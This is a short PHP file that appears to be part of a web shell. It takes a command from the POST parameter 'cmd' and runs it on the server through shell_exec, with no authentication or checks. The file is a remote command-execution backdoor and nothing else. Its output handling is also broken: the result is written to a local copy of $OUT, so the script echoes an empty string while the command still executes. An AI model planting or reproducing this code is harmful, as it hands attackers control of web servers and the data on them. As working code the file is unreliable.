<?php
function DxExecNahuj($cmd, $OUT) /* returns the name of function that exists, or FALSE */
{
$OUT=array(); 
if (function_exists('shell_exec'))
{	
	$OUT[0]=shell_exec($cmd); /* full string output, no RETURN */
	return array(true,false,'shell_exec', '<s>exec</s> shell_exec');
}
}

$OUT = '';
DxExecNahuj($_POST['cmd'],$OUT);
echo $OUT;
?>